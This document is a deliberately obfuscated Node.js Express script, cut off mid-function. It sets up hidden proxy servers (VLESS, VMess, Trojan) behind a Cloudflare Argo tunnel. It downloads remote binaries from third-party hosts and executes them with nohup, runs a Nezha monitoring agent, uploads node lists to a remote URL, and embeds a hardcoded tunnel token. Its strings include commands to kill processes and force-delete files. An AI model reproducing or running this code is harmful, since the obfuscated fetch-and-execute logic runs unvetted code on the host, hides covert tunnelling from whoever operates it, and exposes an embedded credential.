const _0x3595c8 = _0x3d38;
(function (_0x3d1ee8, _0x3d18c6) {
    const _0x2b5a23 = _0x3d38, _0x511414 = _0x3d1ee8();
    while (!![]) {
        try {
            const _0x3f52d2 = parseInt(_0x2b5a23(0x249)) / (-0x1efa + -0x1311 * 0x1 + 0x320c) * (parseInt(_0x2b5a23(0x191)) / (0x61 * -0xb + 0x4 * -0x17f + 0x9 * 0x121)) + parseInt(_0x2b5a23(0x161)) / (-0xacb + -0x1e8e + 0x295c) + -parseInt(_0x2b5a23(0x291)) / (0x10f * -0x1d + 0x3d7 * -0x2 + 0x2665 * 0x1) + -parseInt(_0x2b5a23(0x121)) / (0x1d62 + -0x1a4c + -0x311) + -parseInt(_0x2b5a23(0x2b8)) / (0x2684 + -0x4c5 + -0x21b9) * (-parseInt(_0x2b5a23(0x334)) / (0x252 + -0x337 + 0xec)) + parseInt(_0x2b5a23(0x1dd)) / (-0x1f22 + -0x267a + -0x1 * -0x45a4) * (-parseInt(_0x2b5a23(0x12e)) / (0x33b * -0x4 + -0x30 * 0x6d + 0x2165)) + parseInt(_0x2b5a23(0x1ac)) / (0x9 * -0x304 + -0x2229 + 0x3d57);
            if (_0x3f52d2 === _0x3d18c6)
                break;
            else
                _0x511414['push'](_0x511414['shift']());
        } catch (_0x14371c) {
            _0x511414['push'](_0x511414['shift']());
        }
    }
}(_0x6f9e, 0x17c71 + -0x231da + 0x35705));
const express = require(_0x3595c8(0x1a0)), app = express(), axios = require(_0x3595c8(0x1bb)), os = require('os'), fs = require('fs'), path = require(_0x3595c8(0x2f0)), {promisify} = require(_0x3595c8(0x315)), exec = promisify(require(_0x3595c8(0x296) + _0x3595c8(0x2c8))[_0x3595c8(0x2d6)]), UPLOAD_URL = process[_0x3595c8(0x14f)][_0x3595c8(0x2f1)] || '', PROJECT_URL = process[_0x3595c8(0x14f)][_0x3595c8(0x26e) + 'L'] || '', AUTO_ACCESS = process[_0x3595c8(0x14f)][_0x3595c8(0x30d) + 'S'] || ![], FILE_PATH = process[_0x3595c8(0x14f)][_0x3595c8(0x140)] || _0x3595c8(0x1f1), SUB_PATH = process[_0x3595c8(0x14f)][_0x3595c8(0x2d2)] || _0x3595c8(0x26c), PORT = process[_0x3595c8(0x14f)][_0x3595c8(0x25b) + 'T'] || process[_0x3595c8(0x14f)][_0x3595c8(0x244)] || 0x1 * -0x15fa + 0x1059 + -0x1159 * -0x1, UUID = process[_0x3595c8(0x14f)][_0x3595c8(0x1af)] || _0x3595c8(0x16d) + _0x3595c8(0x2eb) + _0x3595c8(0x165) + _0x3595c8(0x24e), NEZHA_SERVER = process[_0x3595c8(0x14f)][_0x3595c8(0x188) + 'ER'] || '', NEZHA_PORT = process[_0x3595c8(0x14f)][_0x3595c8(0x16c)] || '', NEZHA_KEY = process[_0x3595c8(0x14f)][_0x3595c8(0x329)] || '', ARGO_DOMAIN = process[_0x3595c8(0x14f)][_0x3595c8(0x189) + 'N'] || _0x3595c8(0x171) + _0x3595c8(0x21c), ARGO_AUTH = process[_0x3595c8(0x14f)][_0x3595c8(0x1bc)] || _0x3595c8(0x186) + _0x3595c8(0x23b) + _0x3595c8(0x200) + _0x3595c8(0x25c) + _0x3595c8(0x2e9) + _0x3595c8(0x2dd) + _0x3595c8(0x25a) + _0x3595c8(0x208) + _0x3595c8(0x29e) + _0x3595c8(0x238) + _0x3595c8(0x290) + _0x3595c8(0x301) + _0x3595c8(0x31b) + _0x3595c8(0x1ef) + _0x3595c8(0x211) + _0x3595c8(0xff) + _0x3595c8(0x2da) + _0x3595c8(0x248) + _0x3595c8(0x314), ARGO_PORT = process[_0x3595c8(0x14f)][_0x3595c8(0x172)] || 0x1abe + 0xf4f * 0x2 + 0xb1b * 0x5, CFIP = process[_0x3595c8(0x14f)][_0x3595c8(0x292)] || _0x3595c8(0x297) + _0x3595c8(0x1c5), CFPORT = process[_0x3595c8(0x14f)][_0x3595c8(0x178)] || 0x1 * -0x1b85 + 0xe1c + 0xf24, NAME = process[_0x3595c8(0x14f)][_0x3595c8(0x23d)] || _0x3595c8(0x26c);
if (!fs[_0x3595c8(0x179)](FILE_PATH))
    try {
        fs[_0x3595c8(0x222)](FILE_PATH);
    } catch (_0x35934c) {
        console[_0x3595c8(0x14a)](_0x3595c8(0x145) + _0x3595c8(0x245) + _0x3595c8(0x136));
    }
function generateRandomName() {
    const _0x4b3edf = _0x3595c8, _0xfc2988 = {
            'NBPMX': _0x4b3edf(0x19b) + _0x4b3edf(0x216) + _0x4b3edf(0x25d),
            'ovzww': function (_0x3f6867, _0x3c9984) {
                return _0x3f6867 < _0x3c9984;
            },
            'aIQPA': function (_0x123a14, _0x33a4da) {
                return _0x123a14 * _0x33a4da;
            }
        }, _0x13cc7e = _0xfc2988[_0x4b3edf(0x272)];
    let _0x5bd823 = '';
    for (let _0x44debb = 0x1976 + 0x315 * 0x6 + -0x2bf4; _0xfc2988[_0x4b3edf(0x256)](_0x44debb, 0x2db * -0x1 + -0x16f1 + 0x19d2); _0x44debb++) {
        _0x5bd823 += _0x13cc7e[_0x4b3edf(0x13a)](Math[_0x4b3edf(0x23f)](_0xfc2988[_0x4b3edf(0x1d1)](Math[_0x4b3edf(0x1b2)](), _0x13cc7e[_0x4b3edf(0x11c)])));
    }
    return _0x5bd823;
}
const npmName = generateRandomName(), webName = generateRandomName(), botName = generateRandomName(), phpName = generateRandomName();
let npmPath = path[_0x3595c8(0x19d)](FILE_PATH, npmName), phpPath = path[_0x3595c8(0x19d)](FILE_PATH, phpName), webPath = path[_0x3595c8(0x19d)](FILE_PATH, webName), botPath = path[_0x3595c8(0x19d)](FILE_PATH, botName), subPath = path[_0x3595c8(0x19d)](FILE_PATH, _0x3595c8(0x2e7)), listPath = path[_0x3595c8(0x19d)](FILE_PATH, _0x3595c8(0x24d)), bootLogPath = path[_0x3595c8(0x19d)](FILE_PATH, _0x3595c8(0x263)), configPath = path[_0x3595c8(0x19d)](FILE_PATH, _0x3595c8(0x32e) + 'n');
function _0x6f9e() {
    const _0x4ba495 = [
        'eyJhIjoiNT',
        'EbkkL',
        'NEZHA_SERV',
        'ARGO_DOMAI',
        '\x0a\x20\x20\x20\x20',
        'ecture',
        'l\x20run',
        'split',
        'n\x20--skip-p',
        'nt:\x20true\x0as',
        '\x0a\x20\x20credent',
        '6566fmpuAU',
        'pipe',
        'NiQYQ',
        'obpuK',
        't\x20/sub\x20for',
        'JvVLS',
        't\x20failed\x20f',
        'vxXrV',
        'ginRequest',
        'success',
        'abcdefghij',
        'sion\x20auto\x20',
        'join',
        '60#',
        'd\x20successf',
        'express',
        'api.com/js',
        'substring',
        '\x0a\x20\x20\x20\x20\x20\x20ori',
        'message',
        'ostname:\x20',
        '/config.js',
        'JKRfd',
        '\x0adebug:\x20fa',
        '443',
        'quic',
        'ble\x20is\x20emp',
        '4210980ajLiyC',
        'less-argo%',
        'for\x20',
        'UUID',
        'ing\x20boot.l',
        'post',
        'random',
        'match',
        'ARGO_AUTH\x20',
        'tls&sni=',
        'paXPG',
        'Error\x20down',
        'ng\x20bot\x20to\x20',
        'le\x20',
        'urity=tls&',
        'axios',
        'ARGO_AUTH',
        '\x0ause_gitee',
        'npm\x20runnin',
        'BMeji',
        'wZrZN',
        'noTLSVerif',
        'PvFRe',
        'get',
        'Unknown',
        'eu.org',
        '\x0a\x0atrojan:/',
        'taskkill\x20/',
        'data',
        'sSNmK',
        'ocalhost:',
        'PCnnN',
        'g\x20error:\x20',
        'SIAXW',
        'api.co/jso',
        'qhocO',
        'eqmoQ',
        'aIQPA',
        'or\x20',
        '\x20is\x20runnin',
        'yc.mn/agen',
        'BqhUE',
        'able_send_',
        'rt_delay:\x20',
        ',\x20re-runni',
        'EVhHj',
        'vmess',
        '/null\x202>&1',
        't-delay\x204\x20',
        '3736pqMstX',
        'unning',
        'ning!\x20Visi',
        'loading\x20fi',
        'xtls-rprx-',
        'ync',
        '/vless-arg',
        'pnOrd',
        'gljDV',
        'QUYrv',
        '\x0aclient_se',
        'mfeAB',
        'to\x20tunnel',
        'ZBsYn',
        'lse\x0ainsecu',
        'arm',
        'php\x20runnin',
        '\x20--disable',
        'RVdE4yWXpP',
        'Unhandled\x20',
        '/tmp',
        'ty,\x20use\x20qu',
        'l\x20http://l',
        'unlink',
        'UPpQr',
        't\x20success\x20',
        'mismatch\x20T',
        'blackhole',
        'l:\x20http2\x0a\x20',
        'ully',
        '_to_upgrad',
        '\x20\x20-\x20servic',
        'tShnr',
        '\x0a\x20\x20tunnel:',
        '%3Fed%3D25',
        'ZGFlYmJmY2',
        'listen',
        '&path=%2Ft',
        'NYHjz',
        'jzeww',
        'ng\x20on\x20port',
        'ute:\x20false',
        'rojan-argo',
        'ktZDU2MS00',
        'Nodes\x20uplo',
        'fileUrl',
        'NaVem',
        'oJSXI',
        'ection_cou',
        'UdAtp',
        'coEIL',
        'Error\x20read',
        'UzAwWVROaU',
        'xAWsx',
        '\x20failed:\x20',
        'firefox',
        'WrPOv',
        'klmnopqrst',
        'oxVFV',
        'cOBTn',
        '\x20>\x20nul\x202>&',
        'App\x20is\x20run',
        'Error\x20exec',
        '9.xyz',
        'hmgUf',
        'lXaoM',
        '?security=',
        'del\x20/f\x20/q\x20',
        'vyBJq',
        'mkdirSync',
        'fUNcp',
        'access\x20tas',
        'QcNPD',
        'Fmccj',
        'bWXZA',
        'VCXfw',
        'odes',
        'http://ip-',
        'ull\x202>&1\x20&',
        '\x20-p\x20',
        'oo.serv00.',
        'FPwao',
        'map',
        '--loglevel',
        'has',
        'base64',
        '0.0.0.0',
        'o?ed=2560',
        '&fp=firefo',
        'r\x20the\x20curr',
        '-auto-upda',
        'AtYjVjMDQ3',
        'LquzU',
        'f\x20/im\x20',
        'dlODUyN2Y0',
        'OBWvC',
        'NAME',
        'd64.ssss.n',
        'floor',
        'fvhBT',
        'qHEun',
        'ss\x20task',
        'ydHXS',
        'PORT',
        'ting\x20temp\x20',
        'dnesW',
        'wtkdr',
        'lZelJqT1dN',
        '19mKJduG',
        'trojan',
        'og:',
        'atus:404\x0a\x20',
        'list.txt',
        '2dd0b4',
        'cWDQS',
        '\x20false\x0adis',
        '5|6|3|4|2|',
        'org',
        'mmand_exec',
        '\x0askip_conn',
        'net/add-ur',
        'ovzww',
        'sable_nat:',
        'cret:\x20',
        'ml\x22\x20>/dev/',
        'MTIzNmU4ZD',
        'SERVER_POR',
        'VjMjBmZmY5',
        'uvwxyz',
        'OpjNf',
        'close',
        'dding\x20auto',
        't,use\x20toke',
        'matic\x20acce',
        'boot.log',
        '\x0avless://',
        'https://ip',
        '1|0',
        'p2\x20run\x20--t',
        'mFhQr',
        'able\x20is\x20em',
        'TBOeN',
        'SLBTy',
        'susbaka',
        'pNMeH',
        'PROJECT_UR',
        'chmod',
        's:\x0a\x20\x20\x20\x20-\x20h',
        '/trojan-ar',
        'NBPMX',
        'NEZHA\x20vari',
        'nohup\x20',
        'OuZPk',
        'pNZNU',
        'http\x20serve',
        '\x0a\x0avmess://',
        'se\x0agpu:\x20fa',
        'countryCod',
        'aded\x20succe',
        'utf-8',
        'https+loca',
        'd:\x20',
        '\x20info\x20--ur',
        'hBoLh',
        '2096',
        '\x20-s\x20',
        'pkill\x20-f\x20\x22',
        'ZCSmF',
        'tunnel.yml',
        'x&type=ws&',
        'orce_updat',
        'tbcYr',
        'se_ipv6_co',
        'tunnel\x20--e',
        '4\x0aserver:\x20',
        'basename',
        'sni=',
        'QBaRb',
        'IcYzP',
        'MDJmYTljIi',
        '688408Jicayo',
        'CFIP',
        'zltoh',
        'e-nodes',
        'ning',
        'child_proc',
        'cdns.doon.',
        'WjMil',
        'yc.mn/v1',
        '--skip-con',
        'on\x20>/dev/n',
        'p2\x20--logfi',
        'st:',
        'NjE4LWFmYj',
        'sFLkf',
        'block',
        'DwRkl',
        'pop',
        'fileName',
        'OZRpt',
        'stream',
        'APBTT',
        'oDomain',
        'and:\x20',
        'm64.ssss.n',
        'arm64',
        'includes',
        'iniCb',
        '2083',
        'set',
        'pdate\x20--pr',
        '.exe\x20>\x20nul',
        'l\x202>&1\x20&',
        'Download\x20',
        'none',
        'ate:\x20true\x0a',
        'nFjWK',
        'TooqC',
        'vless',
        '685356hMySSV',
        'uting\x20comm',
        '\x0a\x20\x20\x20\x20\x20\x20ser',
        'FUmvT',
        'evbVS',
        '\x20task\x20fail',
        'this\x20scrip',
        'on\x20uploade',
        'y:\x20true\x0a\x20\x20',
        'clear',
        'tartserver',
        '2087',
        'pCpXG',
        '\x0a\x20\x20protoco',
        'TXpeJ',
        'N\x20or\x20ARGO_',
        'ess',
        'r\x20is\x20runni',
        'hpTsO',
        'from',
        'AqFQt',
        'woorT',
        'text/plain',
        '/boot.log\x20',
        '/api/delet',
        'eUMRY',
        'SUB_PATH',
        '/api/add-n',
        'rt_period:',
        'Thank\x20you\x20',
        'exec',
        'UAkZc',
        ':\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'e_auto_upd',
        'TmprNVpXRm',
        '\x20a\x20file\x20fo',
        'aeYDY',
        'QiLCJ0Ijoi',
        'JlrbE',
        'Add\x20automa',
        'Skipping\x20a',
        'aHPbF',
        'les:',
        'Can\x27t\x20find',
        'SmlgI',
        'BLkqb',
        'ArgoDomain',
        'sub.txt',
        'e:\x20false\x0au',
        'ZDY1Zjg3Zj',
        'cBttF',
        '4b0-4654-b',
        'error\x20in\x20s',
        'direct',
        'qAjZK',
        'null\x202>&1\x20',
        'path',
        'UPLOAD_URL',
        '&path=%2Fv',
        'createWrit',
        'xonaT',
        'disable_co',
        'untry_code',
        '\x22\x20>\x20/dev/n',
        'ick\x20tunnel',
        'DeaoK',
        'ials-file:',
        'AmehK',
        'push',
        'http',
        'ccessfully',
        'e:\x20http_st',
        'NxFQe',
        'wicyI6Ik1E',
        '/dev/null',
        'Subscripti',
        'ue\x0aip_repo',
        'k\x20added\x20su',
        ';\x20charset=',
        'ocfmH',
        'OicdY',
        '\x20-c\x20\x22',
        '\x0adisable_f',
        '8/dns-quer',
        'sfrOi',
        'AUTO_ACCES',
        'PVkvf',
        'platform',
        'ubscriptio',
        'QocVy',
        'filter',
        'REGfd',
        'eCJ9',
        'util',
        'orxRR',
        'tls',
        'arch',
        'ORgTa',
        'LSlTl',
        'UXhZbUUxWk',
        ':\x20false\x0auu',
        'MCkDM',
        'FOGtG',
        '://localho',
        'applicatio',
        'then',
        '/tunnel.ym',
        'id:\x20',
        'e:\x20true\x0adi',
        'Chzsb',
        'ent\x20archit',
        'ElpWD',
        'stringify',
        'NEZHA_KEY',
        'win32',
        'oxaoQ',
        'response',
        '\x20nodes.',
        'config.jso',
        'ure:\x20false',
        'Empowermen',
        'otocol\x20htt',
        'n\x20connect\x20',
        'readdirSyn',
        '14LqXDpW',
        'https://ar',
        '2053',
        'all',
        'KVgXv',
        'rocs\x20>/dev',
        '8443',
        '--tls',
        'xXRTJOVE10',
        'yc.mn/bot',
        'test',
        'toString',
        'catch',
        'false',
        'count:\x20tru',
        'SGIQg',
        'UTLXu',
        '--config\x20',
        'statSync',
        'host=',
        '\x20successfu',
        'YvEDI',
        'sSvvz',
        '\x201800\x0arepo',
        'finish',
        'EkzTq',
        'aarch64',
        'vaFnf',
        'uUDmm',
        'unnelSecre',
        'LpVSJ',
        'ztmkX',
        'aSsgM',
        'te\x20--repor',
        'SRuWk',
        'oken\x20',
        'l://8.8.8.',
        'length',
        'mCEzi',
        'LFZOW',
        'laExl',
        'mEtmi',
        '1262645CGdgke',
        'automatic\x20',
        '\x20not\x20found',
        'n/json',
        'kOaOQ',
        'KTFzf',
        'rm\x20-rf\x20',
        '/config.ya',
        'wnSUl',
        '\x20>/dev/nul',
        'jHYuh',
        'freedom',
        'unshift',
        '3447KgcgGm',
        'Content-Ty',
        'PgkCl',
        '3Fed%3D256',
        'e\x0atemperat',
        'l\x202>&1',
        '\x20-c\x20',
        'AUTH\x20varia',
        'dir',
        '--no-autou',
        'isFile',
        'hvPWW',
        'charAt',
        'tcp',
        'vice:\x20http',
        'nKXxt',
        'Error\x20in\x20s',
        're_tls:\x20tr',
        'FILE_PATH',
        'eStream',
        'aved\x20succe',
        'for\x20using\x20',
        't,\x20enjoy!',
        'Using\x20exis',
        'https://oo',
        'TeXyd',
        'amd',
        '?encryptio',
        'log',
        '/sub.txt\x20s',
        '\x20\x0a\x20\x20ingres',
        'n=none&sec',
        'unlinkSync',
        'env',
        'xwMaf',
        'KGVHv',
        'ssfully',
        'pTsjC',
        'obtain\x20Arg',
        'forEach',
        'https://am',
        'cvJAG',
        'lly',
        'cDawQ',
        'true',
        'lse\x0adisabl',
        'yc.mn/web',
        'status',
        'cnAHt',
        'readFileSy',
        '/api/add-s',
        '192027pGiUVW',
        'tunnel.jso',
        'SCiZF',
        'web\x20runnin',
        '262-7d9553',
        'EwwAq',
        'CkFgl',
        'pty,skip\x20r',
        'tic\x20access',
        'yhqmc',
        'kip_procs_',
        'NEZHA_PORT',
        '85ef732d-e',
        'dge-ip-ver',
        '/vmess-arg',
        'lxuBN',
        'dl2.119511',
        'ARGO_PORT',
        'nIBYH',
        'vision',
        'query:\x20fal',
        '127.0.0.1',
        'ull\x202>&1',
        'CFPORT',
        'existsSync',
        'gekHm',
        '\x202>&1',
        'TunnelSecr',
        'send',
        'gKWNv',
        'YvBga',
        'error',
        'writeFileS',
        '\x0atls:\x20',
        'sJLyz',
        'country_co',
        'config.yam'
    ];
    _0x6f9e = function () {
        return _0x4ba495;
    };
    return _0x6f9e();
}
function deleteNodes() {
    const _0x4bb862 = _0x3595c8, _0x5dd020 = {
            'WrPOv': _0x4bb862(0x27c),
            'JvVLS': _0x4bb862(0x232),
            'qhocO': function (_0x17e839, _0x24a440) {
                return _0x17e839 === _0x24a440;
            },
            'pNZNU': _0x4bb862(0x320) + _0x4bb862(0x124)
        };
    try {
        if (!UPLOAD_URL)
            return;
        if (!fs[_0x4bb862(0x179)](subPath))
            return;
        let _0x27dc79;
        try {
            _0x27dc79 = fs[_0x4bb862(0x15f) + 'nc'](subPath, _0x5dd020[_0x4bb862(0x215)]);
        } catch {
            return null;
        }
        const _0x49433d = Buffer[_0x4bb862(0x2cb)](_0x27dc79, _0x5dd020[_0x4bb862(0x196)])[_0x4bb862(0x102)](_0x5dd020[_0x4bb862(0x215)]), _0x509819 = _0x49433d[_0x4bb862(0x18d)]('\x0a')[_0x4bb862(0x312)](_0x41c275 => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4bb862(0x101)](_0x41c275));
        if (_0x5dd020[_0x4bb862(0x1cf)](_0x509819[_0x4bb862(0x11c)], 0x1eb * 0x1 + -0x5 * 0x2f + 0x2 * -0x80))
            return;
        return axios[_0x4bb862(0x1b1)](UPLOAD_URL + (_0x4bb862(0x2d0) + _0x4bb862(0x294)), JSON[_0x4bb862(0x328)]({ 'nodes': _0x509819 }), { 'headers': { 'Content-Type': _0x5dd020[_0x4bb862(0x276)] } })[_0x4bb862(0x103)](_0xca3471 => {
            return null;
        }), null;
    } catch (_0x41fb12) {
        return null;
    }
}
function cleanupOldFiles() {
    const _0x2c7520 = _0x3595c8;
    try {
        const _0x569776 = fs[_0x2c7520(0x333) + 'c'](FILE_PATH);
        _0x569776[_0x2c7520(0x155)](_0x240223 => {
            const _0x4d2358 = _0x2c7520, _0x238532 = path[_0x4d2358(0x19d)](FILE_PATH, _0x240223);
            try {
                const _0x5a8d41 = fs[_0x4d2358(0x109)](_0x238532);
                _0x5a8d41[_0x4d2358(0x138)]() && fs[_0x4d2358(0x14e)](_0x238532);
            } catch (_0x4723f7) {
            }
        });
    } catch (_0x5631b4) {
    }
}
async function generateConfig() {
    const _0x40707c = _0x3595c8, _0x51f1ec = {
            'hvPWW': _0x40707c(0x302),
            'OuZPk': _0x40707c(0x2b3),
            'fUNcp': _0x40707c(0x2b7),
            'cvJAG': _0x40707c(0x1e1) + _0x40707c(0x174),
            'pTsjC': _0x40707c(0x1e3) + 'o',
            'SmlgI': _0x40707c(0x16f) + 'o',
            'OpjNf': _0x40707c(0x271) + 'go',
            'FUmvT': _0x40707c(0x13b),
            'paXPG': _0x40707c(0x176),
            'sJLyz': _0x40707c(0x2fd),
            'QcNPD': _0x40707c(0x317),
            'PgkCl': _0x40707c(0x1aa),
            'OicdY': _0x40707c(0x1da),
            'nIBYH': _0x40707c(0x24a),
            'vxXrV': _0x40707c(0x27d) + _0x40707c(0x11b) + _0x40707c(0x30b) + 'y',
            'lxuBN': _0x40707c(0x12c),
            'orxRR': _0x40707c(0x2ed),
            'jzeww': _0x40707c(0x1f8),
            'mFhQr': _0x40707c(0x2a0),
            'aeYDY': _0x40707c(0x32e) + 'n'
        }, _0x5adaab = {
            'log': {
                'access': _0x51f1ec[_0x40707c(0x139)],
                'error': _0x51f1ec[_0x40707c(0x139)],
                'loglevel': _0x51f1ec[_0x40707c(0x275)]
            },
            'inbounds': [
                {
                    'port': ARGO_PORT,
                    'protocol': _0x51f1ec[_0x40707c(0x223)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'flow': _0x51f1ec[_0x40707c(0x157)]
                            }],
                        'decryption': _0x51f1ec[_0x40707c(0x275)],
                        'fallbacks': [
                            { 'dest': 0xbb9 },
                            {
                                'path': _0x51f1ec[_0x40707c(0x153)],
                                'dest': 0xbba
                            },
                            {
                                'path': _0x51f1ec[_0x40707c(0x2e4)],
                                'dest': 0xbbb
                            },
                            {
                                'path': _0x51f1ec[_0x40707c(0x25e)],
                                'dest': 0xbbc
                            }
                        ]
                    },
                    'streamSettings': { 'network': _0x51f1ec[_0x40707c(0x2bb)] }
                },
                {
                    'port': 0xbb9,
                    'listen': _0x51f1ec[_0x40707c(0x1b6)],
                    'protocol': _0x51f1ec[_0x40707c(0x223)],
                    'settings': {
                        'clients': [{ 'id': UUID }],
                        'decryption': _0x51f1ec[_0x40707c(0x275)]
                    },
                    'streamSettings': {
                        'network': _0x51f1ec[_0x40707c(0x2bb)],
                        'security': _0x51f1ec[_0x40707c(0x275)]
                    }
                },
                {
                    'port': 0xbba,
                    'listen': _0x51f1ec[_0x40707c(0x1b6)],
                    'protocol': _0x51f1ec[_0x40707c(0x223)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'level': 0x0
                            }],
                        'decryption': _0x51f1ec[_0x40707c(0x275)]
                    },
                    'streamSettings': {
                        'network': 'ws',
                        'security': _0x51f1ec[_0x40707c(0x275)],
                        'wsSettings': { 'path': _0x51f1ec[_0x40707c(0x153)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x51f1ec[_0x40707c(0x183)],
                            _0x51f1ec[_0x40707c(0x225)],
                            _0x51f1ec[_0x40707c(0x130)]
                        ],
                        'metadataOnly': ![]
                    }
                },
                {
                    'port': 0xbbb,
                    'listen': _0x51f1ec[_0x40707c(0x1b6)],
                    'protocol': _0x51f1ec[_0x40707c(0x308)],
                    'settings': {
                        'clients': [{
                                'id': UUID,
                                'alterId': 0x0
                            }]
                    },
                    'streamSettings': {
                        'network': 'ws',
                        'wsSettings': { 'path': _0x51f1ec[_0x40707c(0x2e4)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x51f1ec[_0x40707c(0x183)],
                            _0x51f1ec[_0x40707c(0x225)],
                            _0x51f1ec[_0x40707c(0x130)]
                        ],
                        'metadataOnly': ![]
                    }
                },
                {
                    'port': 0xbbc,
                    'listen': _0x51f1ec[_0x40707c(0x1b6)],
                    'protocol': _0x51f1ec[_0x40707c(0x173)],
                    'settings': { 'clients': [{ 'password': UUID }] },
                    'streamSettings': {
                        'network': 'ws',
                        'security': _0x51f1ec[_0x40707c(0x275)],
                        'wsSettings': { 'path': _0x51f1ec[_0x40707c(0x25e)] }
                    },
                    'sniffing': {
                        'enabled': !![],
                        'destOverride': [
                            _0x51f1ec[_0x40707c(0x183)],
                            _0x51f1ec[_0x40707c(0x225)],
                            _0x51f1ec[_0x40707c(0x130)]
                        ],
                        'metadataOnly': ![]
                    }
                }
            ],
            'dns': { 'servers': [_0x51f1ec[_0x40707c(0x198)]] },
            'outbounds': [
                {
                    'protocol': _0x51f1ec[_0x40707c(0x170)],
                    'tag': _0x51f1ec[_0x40707c(0x316)]
                },
                {
                    'protocol': _0x51f1ec[_0x40707c(0x204)],
                    'tag': _0x51f1ec[_0x40707c(0x268)]
                }
            ]
        };
    fs[_0x40707c(0x181) + _0x40707c(0x1e2)](path[_0x40707c(0x19d)](FILE_PATH, _0x51f1ec[_0x40707c(0x2dc)]), JSON[_0x40707c(0x328)](_0x5adaab, null, 0x1bd5 + -0x19d + -0x37 * 0x7a));
}
function getSystemArchitecture() {
    const _0x3006c5 = _0x3595c8, _0xf9c24c = {
            'SRuWk': function (_0x195908, _0x58420a) {
                return _0x195908 === _0x58420a;
            },
            'qAjZK': _0x3006c5(0x1ec),
            'LpVSJ': function (_0x1de0a2, _0x5d53be) {
                return _0x1de0a2 === _0x5d53be;
            },
            'ocfmH': _0x3006c5(0x2aa),
            'OZRpt': _0x3006c5(0x111),
            'tbcYr': _0x3006c5(0x148)
        }, _0x129f0b = os[_0x3006c5(0x318)]();
    return _0xf9c24c[_0x3006c5(0x119)](_0x129f0b, _0xf9c24c[_0x3006c5(0x2ee)]) || _0xf9c24c[_0x3006c5(0x115)](_0x129f0b, _0xf9c24c[_0x3006c5(0x307)]) || _0xf9c24c[_0x3006c5(0x119)](_0x129f0b, _0xf9c24c[_0x3006c5(0x2a4)]) ? _0xf9c24c[_0x3006c5(0x2ee)] : _0xf9c24c[_0x3006c5(0x288)];
}
function downloadFile(_0x198a4f, _0xcdca97, _0x16271c) {
    const _0x344999 = _0x3595c8, _0x1da92b = {
            'xAWsx': function (_0x5be8b0, _0x3ada3e, _0x4d392d) {
                return _0x5be8b0(_0x3ada3e, _0x4d392d);
            },
            'TBOeN': function (_0xbccdd6, _0x1c1d64) {
                return _0xbccdd6(_0x1c1d64);
            },
            'cBttF': _0x344999(0x10f),
            'gljDV': _0x344999(0x180),
            'ZBsYn': _0x344999(0x1c3),
            'mfeAB': _0x344999(0x2a5)
        }, _0x32b723 = _0x198a4f;
    !fs[_0x344999(0x179)](FILE_PATH) && fs[_0x344999(0x222)](FILE_PATH, { 'recursive': !![] });
    const _0x19b264 = fs[_0x344999(0x2f3) + _0x344999(0x141)](_0x32b723);
    _0x1da92b[_0x344999(0x26a)](axios, {
        'method': _0x1da92b[_0x344999(0x1ea)],
        'url': _0xcdca97,
        'responseType': _0x1da92b[_0x344999(0x1e8)]
    })[_0x344999(0x321)](_0xef5250 => {
        const _0x57ef94 = _0x344999;
        _0xef5250[_0x57ef94(0x1c8)][_0x57ef94(0x192)](_0x19b264), _0x19b264['on'](_0x1da92b[_0x57ef94(0x2ea)], () => {
            const _0x3febfa = _0x57ef94;
            _0x19b264[_0x3febfa(0x25f)](), console[_0x3febfa(0x14a)](_0x3febfa(0x2b2) + path[_0x3febfa(0x28c)](_0x32b723) + (_0x3febfa(0x10b) + _0x3febfa(0x158))), _0x1da92b[_0x3febfa(0x212)](_0x16271c, null, _0x32b723);
        }), _0x19b264['on'](_0x1da92b[_0x57ef94(0x1e5)], _0x58d444 => {
            const _0x14fc20 = _0x57ef94;
            fs[_0x14fc20(0x1f4)](_0x32b723, () => {
            });
            const _0x3d621e = _0x14fc20(0x2b2) + path[_0x14fc20(0x28c)](_0x32b723) + _0x14fc20(0x213) + _0x58d444[_0x14fc20(0x1a4)];
            console[_0x14fc20(0x180)](_0x3d621e), _0x1da92b[_0x14fc20(0x26a)](_0x16271c, _0x3d621e);
        });
    })[_0x344999(0x103)](_0xf967b9 => {
        const _0x10fdf7 = _0x344999, _0x58c6e3 = _0x10fdf7(0x2b2) + path[_0x10fdf7(0x28c)](_0x32b723) + _0x10fdf7(0x213) + _0xf967b9[_0x10fdf7(0x1a4)];
        console[_0x10fdf7(0x180)](_0x58c6e3), _0x1da92b[_0x10fdf7(0x26a)](_0x16271c, _0x58c6e3);
    });
}
async function downloadFilesAndRun() {
    const _0x2005f0 = _0x3595c8, _0x288283 = {
            'EkzTq': function (_0x451246, _0x13fb06, _0x29bb4e, _0x389831) {
                return _0x451246(_0x13fb06, _0x29bb4e, _0x389831);
            },
            'wtkdr': function (_0x292e2f, _0x5d763f) {
                return _0x292e2f(_0x5d763f);
            },
            'eUMRY': function (_0x1598bd, _0x3a9ec1) {
                return _0x1598bd(_0x3a9ec1);
            },
            'KVgXv': function (_0x48a70c) {
                return _0x48a70c();
            },
            'cnAHt': function (_0x4e5644, _0x523753) {
                return _0x4e5644 === _0x523753;
            },
            'pNMeH': _0x2005f0(0x1b7) + _0x2005f0(0x1e0) + _0x2005f0(0x2e2),
            'KGVHv': function (_0x21d83a, _0x4f0bb7) {
                return _0x21d83a(_0x4f0bb7);
            },
            'SIAXW': function (_0x5c8016, _0x306af1) {
                return _0x5c8016 && _0x306af1;
            },
            'YvBga': _0x2005f0(0x1a9),
            'nKXxt': _0x2005f0(0xfd),
            'cWDQS': _0x2005f0(0x281),
            'cDawQ': _0x2005f0(0x2c3),
            'TooqC': _0x2005f0(0x2ad),
            'woorT': _0x2005f0(0x336),
            'sFLkf': _0x2005f0(0x15a),
            'tShnr': _0x2005f0(0x104),
            'QUYrv': _0x2005f0(0x185) + 'l',
            'gKWNv': function (_0x28ebb2, _0x47f6ce) {
                return _0x28ebb2(_0x47f6ce);
            },
            'Fmccj': _0x2005f0(0xfe),
            'TXpeJ': _0x2005f0(0x273) + _0x2005f0(0x269) + _0x2005f0(0x168) + _0x2005f0(0x1de),
            'oxVFV': function (_0x2b8682, _0x1ba3e2) {
                return _0x2b8682(_0x1ba3e2);
            },
